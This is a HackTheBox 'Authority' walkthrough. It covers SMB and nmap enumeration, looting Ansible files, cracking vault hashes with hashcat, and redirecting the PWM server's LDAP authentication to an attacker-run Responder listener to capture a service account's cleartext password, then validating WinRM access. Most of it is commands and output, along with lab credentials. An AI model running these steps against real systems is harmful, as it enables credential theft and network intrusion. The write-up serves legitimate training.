---
render_with_liquid: false
title: HackTheBox Writeup  Authority
date: 2023-07-18 19:32:49 +1400
tags: [hackthebox, nmap, windows, ad, crackmapexec, autorecon, smbget, ansible, ansible-vault, ansible2john, hashcat, ldap, pwm, password-self-service, responder, clear-text-credentials, evil-winrm, adcs, certipy, adcs-esc1, ad-maq, impacket, pass-the-cert, pass-the-cert, dacl-abuse, dacledit, dcsync, golden-ticket]
---



# Recon
---

## CrackMapExec

It allows guest authentication

#### Shares

```bash
┌──(kali㉿kali)-[~/htb/Authority]
└─$ cme smb 10.129.7.151 -u 'a' -p '' --shares
SMB         10.129.7.151    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.151    445    AUTHORITY        [+] authority.htb\a:
SMB         10.129.7.151    445    AUTHORITY        [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.129.7.151    445    AUTHORITY        [*] Enumerated shares
SMB         10.129.7.151    445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.7.151    445    AUTHORITY        -----           -----------     ------
SMB         10.129.7.151    445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.7.151    445    AUTHORITY        C$                              Default share
SMB         10.129.7.151    445    AUTHORITY        Department Shares
SMB         10.129.7.151    445    AUTHORITY        Development     READ
SMB         10.129.7.151    445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.7.151    445    AUTHORITY        NETLOGON                        Logon server share
SMB         10.129.7.151    445    AUTHORITY        SYSVOL                          Logon server share
```

Add to hosts

```bash
echo '10.129.7.151 authority.htb authority.authority.htb' | sudo tee -a /etc/hosts
```

#### Users

```bash
┌──(kali㉿kali)-[~/htb/Authority]
└─$ cme smb authority.htb -u 'a' -p '' --rid-brute | tee cme_users.txt
SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         authority.htb   445    AUTHORITY        [+] authority.htb\a:
SMB         authority.htb   445    AUTHORITY        [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
...
SMB         authority.htb   445    AUTHORITY        1000: HTB\AUTHORITY$ (SidTypeUser)
SMB         authority.htb   445    AUTHORITY        1101: HTB\DnsAdmins (SidTypeAlias)
SMB         authority.htb   445    AUTHORITY        1102: HTB\DnsUpdateProxy (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        1601: HTB\svc_ldap (SidTypeUser)
```

## Autorecon

```bash
sudo $(which autorecon) --dirbuster.wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt" -vv authority.htb 
```

## Nmap

```bash

# Nmap 7.94 scan initiated Tue Jul 18 19:32:48 2023 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/htb/Authority/results/authority.htb/scans/_full_tcp_nmap.txt -oX /home/kali/htb/Authority/results/authority.htb/scans/xml/_full_tcp_nmap.xml authority.htb
adjust_timeouts2: packet supposedly had rtt of -1407179 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -1407179 microseconds.  Ignoring time.
Nmap scan report for authority.htb (10.129.7.151)
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-18 19:32:49 CST for 1111s
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain?       syn-ack ttl 127
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-07-18 15:42:18Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-18T15:51:18+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
...
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
...
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
|_ssl-date: 2023-07-18T15:51:17+00:00; +4h00m01s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-18T15:51:18+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
...
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-18T15:51:17+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
...
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/https-alt syn-ack ttl 127
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-16T13:04:20
| Not valid after:  2025-07-18T00:42:44
| MD5:   fd44:59b3:3443:b6bf:7274:6764:b07c:9334
| SHA-1: 6075:9654:c694:4bf2:4c18:5444:888f:577a:cfd2:3f4d
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIGEmZUwrQ0MA0GCSqGSIb3DQEBCwUAMBcxFTATBgNVBAMM
...
| nOqoNDBbOmpl7xbEaNGItFHpqZoJ8RT338A=
|_-----END CERTIFICATE-----
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Tue, 18 Jul 2023 15:42:26 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Tue, 18 Jul 2023 15:42:24 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Tue, 18 Jul 2023 15:42:25 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Tue, 18 Jul 2023 15:42:34 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49686/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49709/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49715/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60300/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=9%D=7/18%Time=64B67AA0%P=x86_64-pc-linux-gn
...
SF:request\x20syntax,\x20invalid\x20");
Device type: general purpose|WAP|specialized
Running (JUST GUESSING): Microsoft Windows 2019|2012|10|2022|2016|7|2008|Vista (95%), Linux 2.6.X (86%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_7::sp1 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:microsoft:windows_10:1511 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_vista::sp1:home_premium
OS fingerprint not ideal because: maxTimingRatio (1.588000e+00) is greater than 1.4
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows 10 1909 (91%), Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2016 (86%), Microsoft Windows 7 SP1 (86%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (86%), Microsoft Windows 10 1511 (86%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 (86%), Microsoft Windows Windows 7 SP1 (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
...

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 57744/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 14140/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 61978/udp): CLEAN (Failed to receive data)
|   Check 4 (port 51873/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2023-07-18T15:51:00
|_  start_date: N/A

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   268.82 ms 10.10.14.1
2   267.56 ms authority.htb (10.129.7.151)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Jul 18 19:51:20 2023 -- 1 IP address (1 host up) scanned in 1111.34 seconds
```


## 80 - IIS 10.0 Default Page


### Info

![](/assets/obsidian/acfb9e2a0f04cd7ed05c5b219c396f82.png)


## 8443 - Password Self Service 


### Info

![](/assets/obsidian/95cc227b116b81a7c3265a679a81081b.png)


# User Flag
---

## Loot Ansible Configuration

Download all the files from smb share folder : `Development`

```bash
smbget -a -R smb://authority.htb/Development
```

```bash
┌──(kali㉿kali)-[~/htb/Authority]
└─$ mkdir loot&&cd loot

┌──(kali㉿kali)-[~/htb/Authority/loot]
└─$ smbget -a -R smb://authority.htb/Development
Using workgroup WORKGROUP, guest user
smb://authority.htb/Development/Automation/Ansible/ADCS/.ansible-lint
smb://authority.htb/Development/Automation/Ansible/ADCS/.yamllint
smb://authority.htb/Development/Automation/Ansible/ADCS/defaults/main.yml
smb://authority.htb/Development/Automation/Ansible/ADCS/LICENSE
smb://authority.htb/Development/Automation/Ansible/ADCS/meta/main.yml
smb://authority.htb/Development/Automation/Ansible/ADCS/meta/preferences.yml
smb://authority.htb/Development/Automation/Ansible/ADCS/molecule/default/converge.yml
smb://authority.htb/Development/Automation/Ansible/ADCS/molecule/default/molecule.yml
smb://authority.htb/Development/Automation/Ansible/ADCS/molecule/default/prepare.yml
smb://authority.htb/Development/Automation/Ansible/ADCS/README.md
smb://authority.htb/Development/Automation/Ansible/ADCS/requirements.txt
smb://authority.htb/Development/Automation/Ansible/ADCS/requirements.yml
smb://authority.htb/Development/Automation/Ansible/ADCS/SECURITY.md
smb://authority.htb/Development/Automation/Ansible/ADCS/tasks/assert.yml
smb://authority.htb/Development/Automation/Ansible/ADCS/tasks/generate_ca_certs.yml
smb://authority.htb/Development/Automation/Ansible/ADCS/tasks/init_ca.yml
smb://authority.htb/Development/Automation/Ansible/ADCS/tasks/main.yml
smb://authority.htb/Development/Automation/Ansible/ADCS/tasks/requests.yml
smb://authority.htb/Development/Automation/Ansible/ADCS/templates/extensions.cnf.j2
smb://authority.htb/Development/Automation/Ansible/ADCS/templates/openssl.cnf.j2
smb://authority.htb/Development/Automation/Ansible/ADCS/tox.ini
smb://authority.htb/Development/Automation/Ansible/ADCS/vars/main.yml
smb://authority.htb/Development/Automation/Ansible/LDAP/.bin/clean_vault
smb://authority.htb/Development/Automation/Ansible/LDAP/.bin/diff_vault
smb://authority.htb/Development/Automation/Ansible/LDAP/.bin/smudge_vault
smb://authority.htb/Development/Automation/Ansible/LDAP/.travis.yml
smb://authority.htb/Development/Automation/Ansible/LDAP/defaults/main.yml
smb://authority.htb/Development/Automation/Ansible/LDAP/files/pam_mkhomedir
smb://authority.htb/Development/Automation/Ansible/LDAP/handlers/main.yml
smb://authority.htb/Development/Automation/Ansible/LDAP/meta/main.yml
smb://authority.htb/Development/Automation/Ansible/LDAP/README.md
smb://authority.htb/Development/Automation/Ansible/LDAP/tasks/main.yml
smb://authority.htb/Development/Automation/Ansible/LDAP/templates/ldap_sudo_groups.j2
smb://authority.htb/Development/Automation/Ansible/LDAP/templates/ldap_sudo_users.j2
smb://authority.htb/Development/Automation/Ansible/LDAP/templates/sssd.conf.j2
smb://authority.htb/Development/Automation/Ansible/LDAP/templates/sudo_group.j2
smb://authority.htb/Development/Automation/Ansible/LDAP/TODO.md
smb://authority.htb/Development/Automation/Ansible/LDAP/Vagrantfile
smb://authority.htb/Development/Automation/Ansible/LDAP/vars/debian.yml
smb://authority.htb/Development/Automation/Ansible/LDAP/vars/main.yml
smb://authority.htb/Development/Automation/Ansible/LDAP/vars/redhat.yml
smb://authority.htb/Development/Automation/Ansible/LDAP/vars/ubuntu-14.04.yml
smb://authority.htb/Development/Automation/Ansible/PWM/ansible.cfg
smb://authority.htb/Development/Automation/Ansible/PWM/ansible_inventory
smb://authority.htb/Development/Automation/Ansible/PWM/defaults/main.yml
smb://authority.htb/Development/Automation/Ansible/PWM/handlers/main.yml
smb://authority.htb/Development/Automation/Ansible/PWM/meta/main.yml
smb://authority.htb/Development/Automation/Ansible/PWM/README.md
smb://authority.htb/Development/Automation/Ansible/PWM/tasks/main.yml
smb://authority.htb/Development/Automation/Ansible/PWM/templates/context.xml.j2
smb://authority.htb/Development/Automation/Ansible/PWM/templates/tomcat-users.xml.j2
smb://authority.htb/Development/Automation/Ansible/SHARE/tasks/main.yml
Downloaded 78.22kB in 105 seconds
```

The observed project used:
- https://github.com/pwm-project/pwm


## Find Credentials

```bash
┌──(kali㉿kali)-[~/htb/Authority/loot]
└─$ grep -rin pass -E10
```

Interesting : 

```bash
Automation/Ansible/PWM/ansible_inventory-1-ansible_user: administrator
Automation/Ansible/PWM/ansible_inventory:2:ansible_password: Welcome1
Automation/Ansible/PWM/ansible_inventory-3-ansible_port: 5985
Automation/Ansible/PWM/ansible_inventory-4-ansible_connection: winrm
Automation/Ansible/PWM/ansible_inventory-5-ansible_winrm_transport: ntlm
Automation/Ansible/PWM/ansible_inventory-6-ansible_winrm_server_cert_validation: ignore
```

```bash
Automation/Ansible/PWM/defaults/main.yml-9-pwm_require_ssl: false
Automation/Ansible/PWM/defaults/main.yml-10-
Automation/Ansible/PWM/defaults/main.yml-11-pwm_admin_login: !vault |
Automation/Ansible/PWM/defaults/main.yml-12-          $ANSIBLE_VAULT;1.1;AES256
Automation/Ansible/PWM/defaults/main.yml-13-          32666534386435366537653136663731633138616264323230383566333966346662313161326239
Automation/Ansible/PWM/defaults/main.yml-14-          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
Automation/Ansible/PWM/defaults/main.yml-15-          35653634376333666234613466396534343030656165396464323564373334616262613439343033
Automation/Ansible/PWM/defaults/main.yml-16-          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
Automation/Ansible/PWM/defaults/main.yml-17-          3438
Automation/Ansible/PWM/defaults/main.yml-18-
Automation/Ansible/PWM/defaults/main.yml:19:pwm_admin_password: !vault |
Automation/Ansible/PWM/defaults/main.yml-20-          $ANSIBLE_VAULT;1.1;AES256
Automation/Ansible/PWM/defaults/main.yml-21-          31356338343963323063373435363261323563393235633365356134616261666433393263373736
Automation/Ansible/PWM/defaults/main.yml-22-          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
Automation/Ansible/PWM/defaults/main.yml-23-          38656432323830393339336231373637303535613636646561653637386634613862316638353530
Automation/Ansible/PWM/defaults/main.yml-24-          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
Automation/Ansible/PWM/defaults/main.yml-25-          6531
Automation/Ansible/PWM/defaults/main.yml-26-
Automation/Ansible/PWM/defaults/main.yml-27-ldap_uri: ldap://127.0.0.1/
Automation/Ansible/PWM/defaults/main.yml-28-ldap_base_dn: "DC=authority,DC=htb"
Automation/Ansible/PWM/defaults/main.yml:29:ldap_admin_password: !vault |
Automation/Ansible/PWM/defaults/main.yml-30-          $ANSIBLE_VAULT;1.1;AES256
Automation/Ansible/PWM/defaults/main.yml-31-          63303831303534303266356462373731393561313363313038376166336536666232626461653630
Automation/Ansible/PWM/defaults/main.yml-32-          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
Automation/Ansible/PWM/defaults/main.yml-33-          34646237336164356438383034623462323531316333623135383134656263663266653938333334
Automation/Ansible/PWM/defaults/main.yml-34-          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
Automation/Ansible/PWM/defaults/main.yml-35-          3764
```

```bash
Automation/Ansible/PWM/templates/tomcat-users.xml.j2-1-<?xml version='1.0' encoding='cp1252'?>
Automation/Ansible/PWM/templates/tomcat-users.xml.j2-2-
Automation/Ansible/PWM/templates/tomcat-users.xml.j2-3-<tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
Automation/Ansible/PWM/templates/tomcat-users.xml.j2-4- xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
Automation/Ansible/PWM/templates/tomcat-users.xml.j2-5- version="1.0">
Automation/Ansible/PWM/templates/tomcat-users.xml.j2-6-
Automation/Ansible/PWM/templates/tomcat-users.xml.j2:7:<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>
Automation/Ansible/PWM/templates/tomcat-users.xml.j2:8:<user username="robot" password="T0mc@tR00t" roles="manager-script"/>
Automation/Ansible/PWM/templates/tomcat-users.xml.j2-9-
Automation/Ansible/PWM/templates/tomcat-users.xml.j2-10-</tomcat-users>
```

There's an ansible vault

```bash
┌──(kali㉿kali)-[~/…/Automation/Ansible/PWM/defaults]
└─$ cat main.yml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764 
```


## Crack Ansible Vaults

Google search : `$ANSIBLE_VAULT;1.1;AES256 hashcat`

> https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible

Write the encrypted vault data which starts with `$ANSIBLE_VAULT;1.1;AES256` to separate files

```bash
vi pwm_admin_login
vi pwm_admin_password
vi ldap_admin_password
```

Extract the hash for vaults

```bash
ansible2john pwm_admin_login >> ansible.hash
ansible2john pwm_admin_password >> ansible.hash
ansible2john ldap_admin_password >> ansible.hash
```

Get hash mode of ansible for **hashcat**

```bash
┌──(kali㉿kali)-[~/htb/Authority]
└─$ hashcat --example-hashes|grep ansible -E11
Hash mode #16900
  Name................: Ansible Vault
  Category............: Password Manager
  Slow.Hash...........: Yes
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure
  Example.Hash.Format.: plain
  Example.Hash........: $ansible$0*0*6b761adc6faeb0cc0bf197d3d4a4a7d3f1682e4b169cae8fa6b459b3214ed41e*426d313c5809d4a80a4b9bc7d4823070*d8bad190c7fbc7c3cb1c60a27abfb0ff59d6fb73178681c7454d94a0f56a4360
  Example.Pass........: hashcat
  Benchmark.Mask......: ?b?b?b?b?b?b?b
  Autodetect.Enabled..: Yes
  Self.Test.Enabled...: Yes
  Potfile.Enabled.....: Yes
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX
...
```

```bash
.\hashcat.exe D:\kali-share\ansible.hash D:\kali-share\rockyou.txt --user -m 16900
```

![](/assets/obsidian/7fabcc336639a4f24c4f161b6a660519.png)

Every vaults' password is the same : `!@#$%^&*`

```bash
PS J:\.1\PASSWARE\hashcat-6.2.6> .\hashcat.exe D:\kali-share\ansible.hash D:\kali-share\rockyou.txt --user -m 16900 --show
pwm_admin_login:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
ldap_admin_password:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
```

Decrypt vaults with the obtained password

```bash
┌──(kali㉿kali)-[~/htb/Authority]
└─$ cat pwm_admin_login| ansible-vault decrypt
Vault password:!@#$%^&*
Decryption successful
svc_pwm

┌──(kali㉿kali)-[~/htb/Authority]
└─$ cat pwm_admin_password| ansible-vault decrypt
Vault password:!@#$%^&*
Decryption successful
pWm_@dm!N_!23

┌──(kali㉿kali)-[~/htb/Authority]
└─$ vi ldap_admin_password

┌──(kali㉿kali)-[~/htb/Authority]
└─$ cat ldap_admin_password| ansible-vault decrypt
Vault password:!@#$%^&*
Decryption successful
DevT3st@123
```


## Login To PWM Configuration Manager

Tried the password to login Configuration Manager, this worked : `pWm_@dm!N_!23`

![](/assets/obsidian/c9f423e66bfc47ea21c30fc6128d4d73.png)

After login, it will return 404

![](/assets/obsidian/43f791c7579a049324e0f4f547100c06.png)

Go back and visit configuration manager page again

![](/assets/obsidian/cc7127df717166f30fcb3cb8f16ff861.png)


## Tamper LDAP Authentication Callback Endpoint

> Talking about managers and assets managers, they have one thing in common : which is it will manage devices by sending authentication continuously
> 
> Since I have permission to edit configuration in a manager, the next thing to do is edit `IP`, `url` that the sever will authenticate to
{: .prompt-info }

> Configuration Editor Page

![](/assets/obsidian/66cd73eafc84e505e10803b8f89f0ed3.png)

Start **responder** in analyze mode

```bash
sudo responder -A -I tun0
```

Add : `ldap://10.10.14.70:389` in **LDAP URLs** to point to kali machine

![](/assets/obsidian/6973df067b145f62fac5659add517a64.png)

Test LDAP profile to make it send request back to our host

![](/assets/obsidian/a3a2b4c78ebae2cf4c072c14e7015799.png)

Got the ldap cleartext password

```bash
[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[LDAP] Cleartext Client   : 10.10.11.222
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

Validate the credentials

```bash
┌──(kali㉿kali)-[~/htb/Authority]
└─$ cme winrm authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
SMB         authority.htb   5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
HTTP        authority.htb   5985   AUTHORITY        [*] http://authority.htb:5985/wsman
HTTP        authority.htb   5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```


